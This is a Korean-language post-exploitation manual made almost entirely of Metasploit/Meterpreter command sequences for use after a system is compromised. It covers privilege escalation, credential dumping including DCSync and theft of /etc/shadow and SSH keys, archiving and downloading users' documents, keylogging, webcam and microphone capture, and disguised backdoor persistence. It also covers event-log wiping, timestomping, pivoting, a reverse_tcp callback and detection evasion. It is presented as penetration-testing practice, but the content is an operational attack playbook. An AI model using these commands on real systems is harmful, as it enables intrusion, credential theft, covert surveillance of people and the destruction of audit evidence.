# Post-Exploitation 실무 가이드 (시스템 장악 후)

## 권한 상승 (Privilege Escalation)

### Windows 권한 상승

#### 자동 권한 상승 시도

```bash
# 가장 먼저 시도 (성공률 높음)
meterpreter > getsystem

# 실패시 수동 방법들
meterpreter > run post/multi/recon/local_exploit_suggester

# UAC 우회 (Windows 7/8/10)
meterpreter > use exploit/windows/local/bypassuac_injection
meterpreter > set SESSION 1
meterpreter > exploit

# 토큰 도용 (다른 사용자 권한 획득)
meterpreter > ps | grep lsass
meterpreter > steal_token 1234
```

#### 수동 권한 상승 기법

```bash
# 시스템 정보 수집
meterpreter > sysinfo
meterpreter > getuid

# 로컬 익스플로잇 확인
meterpreter > run post/multi/recon/local_exploit_suggester

# 실행 중인 서비스 확인
meterpreter > run post/windows/gather/enum_services

# 스케줄된 작업 확인
meterpreter > run post/windows/gather/enum_scheduled_tasks
```

### Linux 권한 상승

#### 자동 스크립트 활용

```bash
# LinEnum 스크립트 업로드 및 실행
meterpreter > upload /opt/LinEnum/LinEnum.sh /tmp/linenum.sh
meterpreter > execute -f bash -a "-c 'chmod +x /tmp/linenum.sh && /tmp/linenum.sh'" -i

# SUID 바이너리 검색
meterpreter > execute -f find -a "/ -perm -4000 -type f 2>/dev/null" -i

# Kernel 익스플로잇 확인
meterpreter > execute -f uname -a -i
```

## 크리덴셜 덤핑 (현업 핵심)

### Windows 크리덴셜 수집

#### Mimikatz/Kiwi 활용 (가장 강력)

```bash
# Kiwi 확장 로드
meterpreter > load kiwi

# 모든 크리덴셜 덤프
meterpreter > creds_all

# 특정 타입별 덤프
meterpreter > creds_msv      # NTLM 해시
meterpreter > creds_kerberos # Kerberos 티켓
meterpreter > creds_ssp      # SSP 크리덴셜

# 도메인 컨트롤러 동기화 (매우 강력)
meterpreter > dcsync_ntlm krbtgt
meterpreter > dcsync_ntlm administrator
```

#### 전통적인 방법

```bash
# SAM 덤프 (로컬 계정)
meterpreter > hashdump

# LSA 시크릿 덤프
meterpreter > run post/windows/gather/lsa_secrets

# 캐시된 도메인 크리덴셜
meterpreter > run post/windows/gather/cachedump
```

### Linux 크리덴셜 수집

```bash
# /etc/passwd 및 /etc/shadow
meterpreter > download /etc/passwd
meterpreter > download /etc/shadow

# SSH 키 수집
meterpreter > download /root/.ssh/id_rsa
meterpreter > download /home/user/.ssh/id_rsa

# 히스토리 파일 (패스워드 유출 가능)
meterpreter > download /root/.bash_history
meterpreter > download /home/user/.bash_history

# MySQL/PostgreSQL 설정 파일
meterpreter > download /etc/mysql/my.cnf
meterpreter > download /var/lib/pgsql/data/postgresql.conf
```

## 네트워크 정찰 및 확산

### 내부 네트워크 매핑

```bash
# 네트워크 인터페이스 확인
meterpreter > ifconfig

# ARP 테이블 (연결된 시스템들)
meterpreter > arp

# 라우팅 테이블
meterpreter > route

# 자동 라우팅 설정 (피벗팅 준비)
meterpreter > run autoroute -s 192.168.100.0/24
```

### 내부 포트 스캔

```bash
# 백그라운드 세션으로 전환
meterpreter > background

# 내부 네트워크 포트 스캔
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.100.1-254
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 22,80,135,139,445,3389
msf6 auxiliary(scanner/portscan/tcp) > run

# SMB 공유 스캔
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS 192.168.100.1-254
msf6 auxiliary(scanner/smb/smb_enumshares) > run
```

### 도메인 정찰 (Active Directory)

```bash
# 도메인 정보 수집
meterpreter > run post/windows/gather/enum_domain

# 도메인 사용자 목록
meterpreter > run post/windows/gather/enum_domain_users

# 도메인 그룹 정보
meterpreter > run post/windows/gather/enum_domain_group_users

# 도메인 컨트롤러 찾기
meterpreter > run post/windows/gather/enum_domain_controllers
```

## 데이터 수집 및 유출

### 중요 파일 검색

```bash
# 문서 파일 검색
meterpreter > search -f *.doc -d C:\\Users\\
meterpreter > search -f *.pdf -d C:\\Users\\
meterpreter > search -f *.xls -d C:\\Users\\

# 패스워드 관련 파일
meterpreter > search -f *password* -d C:\\
meterpreter > search -f *passwd* -d /home/

# 설정 파일 검색
meterpreter > search -f *.conf -d /etc/
meterpreter > search -f *.config -d C:\\
```

### 브라우저 크리덴셜 수집

```bash
# 저장된 브라우저 패스워드
meterpreter > run post/multi/gather/firefox_creds
meterpreter > run post/windows/gather/enum_chrome

# 브라우저 히스토리
meterpreter > run post/windows/gather/enum_ie
meterpreter > run post/multi/gather/thunderbird_creds
```

### 대용량 데이터 압축 전송

```bash
# 데이터 압축 (Windows)
meterpreter > execute -f cmd.exe -a "/c 7z a -r C:\\temp\\data.7z C:\\Users\\Administrator\\Documents\\*" -H

# 데이터 압축 (Linux)
meterpreter > execute -f tar -a "czf /tmp/data.tar.gz /home/user/Documents/" -H

# 압축파일 다운로드
meterpreter > download C:\\temp\\data.7z
meterpreter > download /tmp/data.tar.gz
```

## 감시 및 모니터링

### 키로깅

```bash
# 키로거 시작
meterpreter > keyscan_start

# 주기적으로 키로그 덤프 (10분마다)
meterpreter > keyscan_dump

# 키로거 중지
meterpreter > keyscan_stop
```

### 스크린 캡처

```bash
# 단일 스크린샷
meterpreter > screenshot

# 연속 스크린샷 (30초마다)
meterpreter > run post/windows/gather/screen_spy TIME=30

# 웹캠 활용
meterpreter > webcam_list
meterpreter > webcam_snap
```

### 오디오 녹음

```bash
# 마이크 녹음 시작
meterpreter > record_mic -d 30  # 30초 녹음

# 녹음 파일 다운로드
meterpreter > download audio.wav
```

## 지속성 확보 (Persistence)

### Windows 지속성 메커니즘

#### 레지스트리 기반 (가장 일반적)

```bash
# 시작 프로그램 등록
meterpreter > upload /root/backdoor.exe C:\\Windows\\System32\\svchost2.exe
meterpreter > reg setval -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v "System Service" -t REG_SZ -d "C:\\Windows\\System32\\svchost2.exe"

# 사용자별 시작 프로그램
meterpreter > reg setval -k HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v "User Service" -t REG_SZ -d "C:\\Windows\\System32\\svchost2.exe"
```

#### 서비스 기반 지속성

```bash
# 새 서비스 생성
meterpreter > execute -f cmd.exe -a "/c sc create \"Windows Security Center\" binPath= \"C:\\Windows\\System32\\svchost2.exe\" start= auto" -H

# 기존 서비스 수정
meterpreter > execute -f cmd.exe -a "/c sc config Spooler binPath= \"C:\\Windows\\System32\\svchost2.exe\"" -H
```

#### 스케줄 작업 (Task Scheduler)

```bash
# 주기적 실행 작업 생성
meterpreter > execute -f schtasks -a "/create /tn \"Windows Update Check\" /tr \"C:\\Windows\\System32\\svchost2.exe\" /sc daily /st 09:00" -H

# 로그온시 실행
meterpreter > execute -f schtasks -a "/create /tn \"User Logon\" /tr \"C:\\Windows\\System32\\svchost2.exe\" /sc onlogon" -H
```

### Linux 지속성 메커니즘

#### Cron 작업

```bash
# 루트 크론탭에 추가
meterpreter > execute -f bash -a "-c 'echo \"*/10 * * * * /tmp/.system_update > /dev/null 2>&1\" >> /var/spool/cron/root'" -H

# 사용자 크론탭에 추가
meterpreter > execute -f crontab -a "-l | { cat; echo \"0 */6 * * * /home/user/.config/update\"; } | crontab -" -H
```

#### SSH 키 기반 지속성

```bash
# 공개키 추가
meterpreter > execute -f bash -a "-c 'mkdir -p /root/.ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAA...\" >> /root/.ssh/authorized_keys'" -H

# 권한 설정
meterpreter > execute -f chmod -a "600 /root/.ssh/authorized_keys" -H
meterpreter > execute -f chmod -a "700 /root/.ssh" -H
```

#### 시스템 서비스 (systemd)

```bash
# 새 서비스 파일 생성
meterpreter > upload /root/backdoor /usr/local/bin/system-monitor
meterpreter > execute -f bash -a "-c 'cat > /etc/systemd/system/system-monitor.service << EOF
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/system-monitor
Restart=always

[Install]
WantedBy=multi-user.target
EOF'" -H

# 서비스 활성화
meterpreter > execute -f systemctl -a "enable system-monitor" -H
meterpreter > execute -f systemctl -a "start system-monitor" -H
```

## 로그 삭제 및 흔적 제거

### Windows 로그 관리

```bash
# 이벤트 로그 전체 삭제
meterpreter > clearev

# 특정 로그만 삭제
meterpreter > execute -f wevtutil -a "cl Security" -H
meterpreter > execute -f wevtutil -a "cl System" -H
meterpreter > execute -f wevtutil -a "cl Application" -H

# 파일 시스템 로그 삭제
meterpreter > rm "C:\\Windows\\System32\\winevt\\Logs\\*"
```

### Linux 로그 관리

```bash
# 주요 로그 파일 삭제
meterpreter > rm /var/log/auth.log*
meterpreter > rm /var/log/secure*
meterpreter > rm /var/log/messages*
meterpreter > rm /var/log/syslog*

# 히스토리 삭제
meterpreter > rm /root/.bash_history
meterpreter > rm /home/user/.bash_history

# 현재 세션 히스토리 클리어
meterpreter > execute -f bash -a "-c 'history -c && history -w'" -H
```

### 타임스탬프 조작

```bash
# 파일 생성/수정 시간 변경 (Windows)
meterpreter > timestomp C:\\Windows\\System32\\evil.exe -f C:\\Windows\\System32\\notepad.exe

# Linux에서 파일 시간 변경
meterpreter > execute -f touch -a "-r /bin/ls /tmp/backdoor" -H
```

## 네트워크 터널링 및 피벗팅

### SOCKS 프록시 설정

```bash
# Meterpreter 세션에서 라우팅 추가
meterpreter > run autoroute -s 192.168.100.0/24
meterpreter > background

# SOCKS 프록시 서버 시작
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > run -j

# proxychains 설정 후 다른 도구 사용
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT 192.168.100.1-50 -p 22,80,443
```

### 포트 포워딩 실무 활용

```bash
# RDP 포트 포워딩 (원격 데스크톱 접근)
meterpreter > portfwd add -l 3390 -p 3389 -r 192.168.100.10

# SSH 포트 포워딩
meterpreter > portfwd add -l 2222 -p 22 -r 192.168.100.20

# 웹 애플리케이션 포트 포워딩
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.100.30

# 로컬에서 접근
# rdesktop 127.0.0.1:3390
# ssh user@127.0.0.1 -p 2222
# curl http://127.0.0.1:8080
```

## 고급 정찰 기법

### Active Directory 공격

```bash
# 도메인 정보 덤프
meterpreter > run post/windows/gather/enum_domain

# Kerberoasting 공격
meterpreter > load kiwi
meterpreter > kerberos

# DCSync 공격 (Domain Admin 권한 필요)
meterpreter > dcsync_ntlm krbtgt
meterpreter > dcsync_ntlm domain_admin
```

### 네트워크 스니핑

```bash
# 패킷 캡처 시작
meterpreter > load sniffer
meterpreter > sniffer_interfaces
meterpreter > sniffer_start 1

# 캡처된 패킷 덤프
meterpreter > sniffer_dump 1 /tmp/capture.pcap
meterpreter > download /tmp/capture.pcap
```

## 실무 팁과 주의사항

### 세션 안정화

```bash
# 안정적인 프로세스로 마이그레이션
meterpreter > ps | grep explorer.exe
meterpreter > migrate <explorer_pid>

# 백업 통신 채널 설정
meterpreter > transport add -t reverse_tcp -l 10.10.14.50 -p 4445
```

### 탐지 회피

```bash
# 실행 간격 조절
meterpreter > sleep 10

# 메모리에서만 실행
meterpreter > execute -f payload.exe -m

# 프로세스 숨기기
meterpreter > migrate <system_process_pid>
```

### 데이터 전송 최적화

```bash
# 압축 전송으로 시간 절약
meterpreter > execute -f 7z -a "a -r C:\\temp\\exfil.7z C:\\Users\\target\\Documents\\*" -H

# 분할 전송 (큰 파일의 경우)
meterpreter > execute -f split -a "-b 10M /tmp/largefile.dat /tmp/part_" -H
```

이 가이드는 실제 침투 테스트에서 시스템 장악 후 수행하는 모든 단계를 실무 중심으로 정리했습니다. 각 기법들은 실제 현장에서 검증된 방법들입니다.
